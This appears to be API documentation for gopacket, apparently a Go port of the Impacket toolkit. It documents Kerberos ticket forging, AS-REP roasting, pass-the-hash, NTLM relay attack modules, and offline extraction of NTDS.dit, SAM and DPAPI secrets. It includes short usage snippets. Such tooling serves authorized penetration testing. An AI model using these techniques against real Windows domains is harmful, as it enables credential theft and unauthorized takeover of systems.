## pkg/kerberos — Kerberos 5 Client

Full Kerberos 5 client supporting ccache, keytab, and password authentication. Includes ticket forging (golden/silver), AS-REP roasting, key list attacks, and PAC parsing.

### Types

#### `Client`

```go
type Client struct {
    KrbClient *client.Client       // Underlying gokrb5 client
    // ... internal fields
}
```

#### `TGTRequest`

```go
type TGTRequest struct {
    Username, Password, Domain string
    NTHash, AESKey             string
    DCIP, DCHost, Service      string
    PrincipalType              int32
}
```

#### `TGTResult`

```go
type TGTResult struct {
    Ticket     []byte
    SessionKey types.EncryptionKey
    CName      types.PrincipalName
    SName      types.PrincipalName
    Realm      string
    AuthTime   time.Time
    EndTime    time.Time
    RenewTill  time.Time
    Flags      uint32
}
```

### Constructor

```go
func NewClientFromSession(creds *session.Credentials, target session.Target, dcIP string) (*Client, error)
```

**Credential resolution order:**

1.  `KRB5CCNAME` environment variable → ccache file
2.  `<username>.ccache` in current directory
3.  `creds.Keytab` → keytab file
4.  `creds.Password` → password-based AS-REQ

### AP-REQ Generation

| Method | Signature | Description |
| :--- | :--- | :--- |
| `GenerateAPReq` | `(spn string) ([]byte, []byte, error)` | Generate AP-REQ for SMB auth. Returns `(apReqBytes, sessionKeyBytes, error)` |
| `GenerateAPReqFull` | `(spn string) ([]byte, EncryptionKey, error)` | Generate AP-REQ with full encryption key |
| `GenerateAPReqWithBinding` | `(spn string, channelBinding []byte) ([]byte, EncryptionKey, error)` | AP-REQ with TLS channel binding |
| `GenerateDCERPCToken` | `(spn string) ([]byte, EncryptionKey, error)` | AP-REQ wrapped in SPNEGO for DCE/RPC (sets SeqNum=0, DCE-style flags) |

### Ticket Operations

| File | Key Functions | Description |
| :--- | :--- | :--- |
| `gettgt.go` | `GetTGT(req TGTRequest) (*TGTResult, error)` | Request a TGT via AS-REQ |
| `getst.go` | `GetST(tgtRes *TGTResult, spn string) (...)` | Request service ticket via TGS-REQ |
| `ticketer.go` | `ForgeTicket(...)` | Forge golden/silver tickets |
| `asrep.go` | `ASREPRoast(...)` | AS-REP roasting (no pre-auth) |
| `keylist.go` | `KeyListAttack(...)` | KERB-KEY-LIST-REQ (RODC attack) |
| `pac.go` | PAC parsing types and functions | Decode PAC from tickets |
| `keytab.go` | Keytab utilities | Load and manipulate keytab files |
| `tgsrep.go` | TGS-REP parsing | Parse service ticket responses |

### SPNEGO Helpers

```go
// Wrap raw AP-REQ in SPNEGO NegTokenInit for HTTP/LDAP Negotiate auth
func WrapInSPNEGO(krb5Token []byte) ([]byte, error)
```

### Convenience Function

```go
// All-in-one: create client, get ticket, wrap in SPNEGO
func GetAPReq(spn, username, password, domain, hashes, aesKey, kdcHost string,
    channelBinding []byte) ([]byte, error)
```

### Example: Request a TGT

```go
package main

import (
    "fmt"
    "gopacket/pkg/kerberos"
    "gopacket/pkg/session"
)

func main() {
    creds := &session.Credentials{
        Domain:   "CORP.LOCAL",
        Username: "admin",
        Password: "Password1",
    }
    target := session.Target{Host: "dc01.corp.local"}

    krbClient, err := kerberos.NewClientFromSession(creds, target, "10.0.0.1")
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    // Generate AP-REQ for an SMB service
    apReq, sessionKey, err := krbClient.GenerateAPReq("cifs/dc01.corp.local")
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    fmt.Printf("[+] AP-REQ: %d bytes, session key: %d bytes\n", len(apReq), len(sessionKey))
}
```

---

## pkg/ntlm — NTLM Authentication Protocol

Complete NTLMv2 client implementation supporting password and pass-the-hash authentication. Used internally by the SMB, LDAP, and DCE/RPC packages.

### Types

#### `Client`

```go
type Client struct {
    User        string // Username
    Password    string // Password (plaintext)
    Hash        []byte // NT hash (16 bytes) for pass-the-hash
    Domain      string // e.g. "WORKGROUP", "CORP"
    Workstation string // e.g. "WORKSTATION"
    TargetSPN   string // SPN for MIC calculation
}
```

#### `Session`

Returned by `Client.Session()` after successful authentication. Provides signing and sealing methods for authenticated protocols.

### Methods

#### Three-Message Handshake

```go
// Step 1: Create NEGOTIATE message
func (c *Client) Negotiate() ([]byte, error)

// Step 2: Process CHALLENGE, create AUTHENTICATE message
func (c *Client) Authenticate(challengeMsg []byte) ([]byte, error)

// Step 3: Get session for signing/sealing
func (c *Client) Session() *Session
```

### Convenience Functions

```go
// Create a standalone Negotiate message
func NewNegotiateMessage(domain, workstation string) *NegotiateMessage

// Create an Authenticate message from a challenge (one-shot)
func CreateAuthenticateMessage(challenge []byte, username, password, domain string,
    lmHash, ntHash, cbt []byte) ([]byte, error)
```

### Example: NTLM Exchange

```go
ntlmClient := &ntlm.Client{
    User:     "admin",
    Password: "Password1",
    Domain:   "CORP",
}

// Step 1: Negotiate
negotiateMsg, _ := ntlmClient.Negotiate()
// ... send to server, receive challenge ...

// Step 2: Authenticate
authMsg, _ := ntlmClient.Authenticate(challengeMsg)
// ... send to server ...

// Step 3: Get session for signing
session := ntlmClient.Session()
```

### Example: Pass-the-Hash

```go
ntHash, _ := hex.DecodeString("aad3b435b51404eeaad3b435b51404ee")

ntlmClient := &ntlm.Client{
    User:   "admin",
    Hash:   ntHash,
    Domain: "CORP",
}

negotiateMsg, _ := ntlmClient.Negotiate()
// ... continue handshake ...
```

---

## pkg/security — Security Descriptors, ACLs & SIDs

Parse, manipulate, and serialize Windows security descriptors, access control lists, and security identifiers. Essential for DACL editing, RBCD attacks, and permission analysis.

### Types

#### `SID`

```go
type SID struct {
    Revision            uint8
    SubAuthorityCount   uint8
    IdentifierAuthority [6]byte
    SubAuthority        []uint32
}
```

#### `SecurityDescriptor`

```go
type SecurityDescriptor struct {
    Revision uint8
    Sbz1     uint8
    Control  uint16
    Owner    *SID
    Group    *SID
    SACL     *ACL
    DACL     *ACL
}
```

#### `ACL` and `ACE`

Access Control Lists containing Access Control Entries with Allow/Deny rules, object GUIDs, and access masks.

### SID Functions

| Function | Signature | Description |
| :--- | :--- | :--- |
| `ParseSID` | `(s string) (*SID, error)` | Parse string SID (`S-1-5-21-...`) |
| `ParseSIDBytes` | `(data []byte) (*SID, int, error)` | Parse binary SID, returns bytes consumed |

### SID Methods

| Method | Signature | Description |
| :--- | :--- | :--- |
| `String` | `() string` | Format as `S-1-5-21-...` |
| `Marshal` | `() []byte` | Serialize to binary |
| `Size` | `() int` | Binary size in bytes |
| `Equal` | `(other *SID) bool` | Compare two SIDs |

### Security Descriptor Functions

| Function | Signature | Description |
| :--- | :--- | :--- |
| `ParseSecurityDescriptor` | `(data []byte) (*SecurityDescriptor, error)` | Parse self-relative binary SD |

### Security Descriptor Methods

| Method | Signature | Description |
| :--- | :--- | :--- |
| `Marshal` | `() []byte` | Serialize to self-relative binary |

### ACL Functions

| Function | Signature | Description |
| :--- | :--- | :--- |
| `ParseACL` | `(data []byte) (*ACL, error)` | Parse binary ACL |

### Example: Parse and Display a Security Descriptor

```go
package main

import (
    "fmt"
    "gopacket/pkg/security"
)

func main() {
    // Binary SD from LDAP nTSecurityDescriptor attribute
    sdBytes := []byte{...}

    sd, err := security.ParseSecurityDescriptor(sdBytes)
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    fmt.Printf("Owner: %s\n", sd.Owner.String())
    fmt.Printf("Group: %s\n", sd.Group.String())

    if sd.DACL != nil {
        for _, ace := range sd.DACL.ACEs {
            fmt.Printf("  ACE: Type=%d, SID=%s, Mask=0x%08x\n",
                ace.Type, ace.SID.String(), ace.AccessMask)
        }
    }
}
```

### Example: Build a Security Descriptor for RBCD

```go
// Create an ACE allowing a machine account
machineSID, _ := security.ParseSID("S-1-5-21-123456789-123456789-123456789-1234")

// Build SD with a DACL containing an Allow ACE
sd := &security.SecurityDescriptor{
    Revision: 1,
    Control:  security.SE_DACL_PRESENT | security.SE_SELF_RELATIVE,
    DACL: &security.ACL{
        // ... construct ACEs granting AllExtendedRights
    },
}

sdBytes := sd.Marshal()
// Write to msDS-AllowedToActOnBehalfOfOtherIdentity via LDAP
```

---

## pkg/ese — ESE Database Parser

Parse Extensible Storage Engine databases, primarily for offline NTDS.dit analysis to extract Active Directory hashes.

### Types

```go
type Database struct { /* ... */ }
type Table struct { /* ... */ }
type Record struct { /* ... */ }
type ColumnDef struct { /* ... */ }
```

### Functions

| Function | Signature | Description |
| :--- | :--- | :--- |
| `Open` | `(data []byte) (*Database, error)` | Parse an ESE database from bytes |

### Database Methods

| Method | Signature | Description |
| :--- | :--- | :--- |
| `GetTable` | `(name string) (*Table, error)` | Access a table by name |

### Table Methods

| Method | Signature | Description |
| :--- | :--- | :--- |
| `OpenTable` | `() error` | Initialize table for record enumeration |
| `GetNextRecord` | `() (*Record, error)` | Read next record |
| `Columns` | `() []ColumnDef` | Get column definitions |

### Example: Read NTDS.dit

```go
package main

import (
    "fmt"
    "os"
    "gopacket/pkg/ese"
)

func main() {
    data, _ := os.ReadFile("ntds.dit")
    db, err := ese.Open(data)
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    table, _ := db.GetTable("datatable")
    table.OpenTable()

    for {
        record, err := table.GetNextRecord()
        if err != nil {
            break
        }
        // Extract ATTm590045 (sAMAccountName), ATTk589879 (ntHash), etc.
        _ = record
    }
}
```

---

## pkg/registry — Windows Registry Hive Parser

Offline parser for Windows registry hive files (SAM, SYSTEM, SECURITY). Used by `secretsdump` for local credential extraction.

### Types

```go
type Hive struct { /* ... */ }
```

### Functions

| Function | Signature | Description |
| :--- | :--- | :--- |
| `Open` | `(data []byte) (*Hive, error)` | Parse a registry hive from bytes |

### Specialized Parsers

| File | Functions | Description |
| :--- | :--- | :--- |
| `system.go` | Boot key extraction | Extract the SYSKEY from the SYSTEM hive |
| `sam.go` | SAM parsing | Extract local user hashes from the SAM hive |
| `security.go` | LSA secrets, cached credentials | Extract LSA secrets and domain cached credentials from the SECURITY hive |
| `crypto.go` | Decryption helpers | AES/DES/RC4 decryption for registry secrets |

### Example: Extract Boot Key

```go
data, _ := os.ReadFile("SYSTEM")
hive, err := registry.Open(data)
if err != nil {
    fmt.Printf("[-] %v\n", err)
    return
}

bootKey := hive.GetBootKey()
fmt.Printf("[+] Boot key: %x\n", bootKey)
```

---

## pkg/dpapi — DPAPI Decryption

Parse and decrypt Windows Data Protection API blobs, master keys, credential files, and vaults.

### Types

| Type | Description |
| :--- | :--- |
| `DPAPIBlob` | Encrypted DPAPI blob structure |
| `MasterKey` | DPAPI master key |
| `Credential` | Decrypted Windows credential |
| `CredentialFile` | DPAPI credential file |

### Key Files

| File | Description |
| :--- | :--- |
| `dpapi.go` | DPAPI blob structure and AES/3DES decryption |
| `backupkey.go` | Domain DPAPI backup key extraction (via BKRP RPC) |
| `credhist.go` | Credential history file parsing |
| `vault.go` | Windows Vault parsing |

---

## pkg/ntfs — NTFS Filesystem Parser

Offline NTFS filesystem parser for reading files directly from disk images or raw NTFS volumes. Used by tools that need to extract files from offline media.

---

## pkg/tds — SQL Server TDS Protocol

TDS (Tabular Data Stream) client for Microsoft SQL Server. Supports SQL authentication, Windows (NTLM) authentication, and Kerberos authentication.

### Types

```go
type Client struct { /* ... */ }
type TDSPacket struct { /* ... */ }
```

### Features

*   SQL Server login with password, NTLM hash, or Kerberos
*   SQL query execution and result parsing
*   TDS packet marshaling/unmarshaling
*   Response token parsing (row data, error messages, env changes)

---

## pkg/mqtt — MQTT Protocol Client

MQTT protocol client for testing broker authentication.

### Types

```go
type Connection struct { /* ... */ }
```

### Functions

```go
func NewConnection(host string, port int, useSSL bool) (*Connection, error)
func (c *Connection) Connect(clientID, username, password string) error
```

---

## pkg/relay — NTLM Relay Framework

Complete NTLM relay framework with pluggable capture servers, relay clients, and attack modules. This is the engine behind `ntlmrelayx`.

### Architecture

```
Capture Servers → Relay Engine → Relay Clients → Attack Modules
(SMB, HTTP, ...)    (routing)    (SMB, LDAP, ...)   (secretsdump, ...)
```

### Capture Servers

| Server | Description |
| :--- | :--- |
| SMB | Rogue SMB server capturing NTLM auth |
| HTTP/HTTPS | HTTP Negotiate/NTLM capture |
| WCF | Active Directory Web Services capture |
| RAW | Raw TCP NTLM capture |
| RPC | DCE/RPC NTLM capture |
| WinRM | WinRM NTLM capture |

### Relay Clients

| Client | Description |
| :--- | :--- |
| SMB | Relay to SMB targets |
| LDAP/LDAPS | Relay to LDAP (with TLS support) |
| HTTP/HTTPS | Relay to HTTP endpoints |
| MSSQL | Relay to SQL Server |
| WinRM | Relay to WinRM |
| RPC | Relay to DCE/RPC |

### Attack Modules

| Attack | Description |
| :--- | :--- |
| `shares` | Enumerate SMB shares |
| `smbexec` | Command execution via service creation |
| `samdump` | SAM hash extraction |
| `secretsdump` | Full NTDS.DIT extraction (DCSync) |
| `tschexec` | Execution via Task Scheduler |
| `ldapdump` | LDAP dump |
| `delegate` | RBCD manipulation |
| `aclabuse` | ACL modification |
| `addcomputer` | Machine account creation |
| `shadowcreds` | Shadow credentials attack |
| `laps` | LAPS password dumping |
| `gmsa` | gMSA password dumping |
| `adddns` | DNS record manipulation |
| `mssqlquery` | SQL query execution |
| `adcs` | ADCS certificate request (ESC8) |
| `winrmexec` | WinRM command execution |

### Key Files

| File | Description |
| :--- | :--- |
| `config.go` | Relay configuration (targets, attacks, servers) |
| `attack.go` | Attack module registry |
| `client.go` | Relay client abstractions |
| `server.go` | Relay capture server abstractions |
| `console.go` | Interactive relay console |
| `api_server.go` | REST API for relay orchestration |

---

## pkg/structure — Binary Serialization

Helpers for little-endian and big-endian binary packing/unpacking of Go structs. Used throughout the codebase for protocol message serialization.

### Functions

```go
// Little-endian
func PackLE(v interface{}) ([]byte, error)
func UnpackLE(data []byte, v interface{}) error

// Big-endian
func PackBE(v interface{}) ([]byte, error)
func UnpackBE(data []byte, v interface{}) error
```

---

## pkg/utf16le — UTF-16LE String Encoding

UTF-16 Little-Endian encoding and decoding utilities used throughout Windows protocol implementations.

---

## pkg/transport — Proxy-Aware TCP Dialer

TCP dialer that supports proxychains via CGO `libc_dial` interception. All protocol clients use this dialer for transparent proxy support.

### Types

```go
type Dialer struct { /* ... */ }
```

### Functions

```go
func (d *Dialer) Dial(network, address string) (net.Conn, error)
```

The dialer uses CGO to call libc's `connect()`, enabling LD_PRELOAD-based interception by proxychains.

---

## Authentication Patterns

All protocol clients support three authentication methods through the unified `session.Credentials` struct:

### Password

```go
creds := &session.Credentials{
    Domain:   "CORP",
    Username: "admin",
    Password: "Password1",
}
```

### Pass-the-Hash

```go
creds := &session.Credentials{
    Domain:   "CORP",
    Username: "admin",
    Hash:     ":aad3b435b51404eeaad3b435b51404ee",
}
```

### Kerberos

**From ccache (environment variable):**

```go
os.Setenv("KRB5CCNAME", "/path/to/admin.ccache")

creds := &session.Credentials{
    Domain:      "CORP.LOCAL",
    Username:    "admin",
    UseKerberos: true,
    DCIP:        "10.0.0.1",
}
```

**From keytab:**

```go
creds := &session.Credentials{
    Domain:      "CORP.LOCAL",
    Username:    "svc-account",
    UseKerberos: true,
    DCIP:        "10.0.0.1",
    Keytab:      "/path/to/svc.keytab",
}
```

**From password (requests TGT automatically):**

```go
creds := &session.Credentials{
    Domain:      "CORP.LOCAL",
    Username:    "admin",
    Password:    "Password1",
    UseKerberos: true,
    DCIP:        "10.0.0.1",
}
```

---

## End-to-End Examples

### Custom Share Scanner

Build a tool that scans multiple hosts for accessible shares:

```go
package main

import (
    "fmt"
    "gopacket/pkg/flags"
    "gopacket/pkg/session"
    "gopacket/pkg/smb"
)

func main() {
    opts := flags.Parse()
    target, creds, _ := session.ParseTargetString(opts.TargetStr)
    opts.ApplyToSession(&target, &creds)
    session.EnsurePassword(&creds)

    client := smb.NewClient(target, &creds)
    defer client.Close()

    if err := client.Connect(); err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    shares, _ := client.ListShares()
    for _, share := range shares {
        fmt.Printf("[+] \\\\%s\\%s\n", target.Host, share)

        if err := client.UseShare(share); err != nil {
            fmt.Printf("    [-] Access denied\n")
            continue
        }

        files, err := client.Ls(".")
        if err != nil {
            fmt.Printf("    [-] Cannot list: %v\n", err)
            continue
        }
        fmt.Printf("    [+] %d items\n", len(files))
    }
}
```

### LDAP + DACL Editor

Read and modify DACLs on AD objects:

```go
package main

import (
    "fmt"
    "gopacket/pkg/flags"
    "gopacket/pkg/ldap"
    "gopacket/pkg/security"
    "gopacket/pkg/session"
)

func main() {
    opts := flags.Parse()
    target, creds, _ := session.ParseTargetString(opts.TargetStr)
    opts.ApplyToSession(&target, &creds)
    session.EnsurePassword(&creds)

    client := ldap.NewClient(target, &creds)
    defer client.Close()
    client.Connect(false)
    client.Login()

    baseDN, _ := client.GetDefaultNamingContext()

    // Read security descriptor from an object
    result, _ := client.Search(
        baseDN,
        "(sAMAccountName=target-user)",
        []string{"nTSecurityDescriptor"},
    )

    if len(result.Entries) > 0 {
        sdBytes := result.Entries[0].GetRawAttributeValue("nTSecurityDescriptor")
        sd, _ := security.ParseSecurityDescriptor(sdBytes)
        fmt.Printf("Owner: %s\n", sd.Owner.String())

        if sd.DACL != nil {
            for _, ace := range sd.DACL.ACEs {
                fmt.Printf("  ACE: SID=%s Mask=0x%x\n", ace.SID.String(), ace.AccessMask)
            }
        }
    }
}
```

### DCE/RPC Service Control

Create and start a service remotely via SVCCTL:

```go
package main

import (
    "fmt"
    "gopacket/pkg/dcerpc"
    "gopacket/pkg/dcerpc/svcctl"
    "gopacket/pkg/flags"
    "gopacket/pkg/session"
    "gopacket/pkg/smb"
)

func main() {
    opts := flags.Parse()
    target, creds, _ := session.ParseTargetString(opts.TargetStr)
    opts.ApplyToSession(&target, &creds)
    session.EnsurePassword(&creds)

    // Connect SMB
    smbClient := smb.NewClient(target, &creds)
    defer smbClient.Close()
    smbClient.Connect()

    // Open pipe and bind
    pipe, _ := smbClient.OpenPipe("svcctl")
    rpcClient := dcerpc.NewClient(pipe)
    rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion)

    // Use SVCCTL operations...
    // (see tools/services/ and tools/psexec/ for complete examples)
}
```

### Offline Registry + SAM Dump

Parse registry hives offline for credential extraction:

```go
package main

import (
    "fmt"
    "os"
    "gopacket/pkg/registry"
)

func main() {
    // Read hive files
    systemData, _ := os.ReadFile("SYSTEM")
    samData, _ := os.ReadFile("SAM")

    systemHive, _ := registry.Open(systemData)
    samHive, _ := registry.Open(samData)

    // Extract boot key from SYSTEM
    bootKey := systemHive.GetBootKey()
    fmt.Printf("[+] Boot key: %x\n", bootKey)

    // Use boot key to decrypt SAM hashes
    _ = samHive
    // (see tools/secretsdump/ for the complete implementation)
}
```

---

## Known Limitations

These are protocol-level limitations shared with Impacket, not gopacket bugs:

*   **SMB to LDAPS relay** fails on patched DCs due to NTLM MIC validation (post-CVE-2019-1040). Use HTTP coercion instead.
*   **WinRM relay** blocked by EPA (Extended Protection for Authentication) on patched Server 2019+.
*   **RPC relay attacks** (tschexec, enum-local-admins) require PKT_INTEGRITY which is unavailable in relay sessions.
*   **LDAP relay to port 389** fails on DCs requiring LDAP signing. Always relay to LDAPS (port 636).
*   **Shadow credentials** certificate generation is not implemented. Use pywhisker as a workaround.
*   **SMB relay → registry** subkey access denied due to impersonation level issues.

## Missing Features (vs Impacket)

**Relay protocol clients:** IMAP, SMTP relay clients not yet implemented.

**Relay attacks:** SCCM policy/DP attacks (requires SCCM infrastructure).

**Standalone tools:** `ifmap.py`, `mimikatz.py`, `goldenPac.py` (MS14-068, obsolete), `smbrelayx.py` (superseded), `kintercept.py`.

## Reporting Issues

If you encounter a problem:

1.  Run the same operation with Impacket and note whether it succeeds or fails
2.  Re-run with `-debug` and capture the full output
3.  Include both outputs in your report

**Bug Reports:** [https://forms.gle/CaJ8hJ1UT8Wm7zp3A](https://forms.gle/CaJ8hJ1UT8Wm7zp3A)

**Feature Requests:** [https://forms.gle/o6CLbWBLM1oXJ6yQ6](https://forms.gle/o6CLbWBLM1oXJ6yQ6)
